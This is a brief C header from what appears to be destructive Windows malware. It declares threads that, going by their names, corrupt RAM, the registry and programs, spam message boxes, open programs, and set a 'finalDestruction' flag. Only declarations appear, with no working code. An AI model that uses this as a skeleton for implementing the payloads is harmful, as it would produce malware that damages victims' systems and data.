extern BOOL finalDestruction;
DWORD WINAPI PayloadThread(LPVOID parameter);

DWORD WINAPI CorruptRAMThread(LPVOID parameter);
DWORD WINAPI OpenProgramsThread(LPVOID parameter);
DWORD WINAPI CorruptRegistryThread(LPVOID parameter);
DWORD WINAPI HWNDFuckerThread(LPVOID parameter);
DWORD WINAPI ProgramCorruptorThread(LPVOID parameter);
DWORD WINAPI MsgBoxSpamThread(LPVOID parameter);

LPTSTR randomEXE();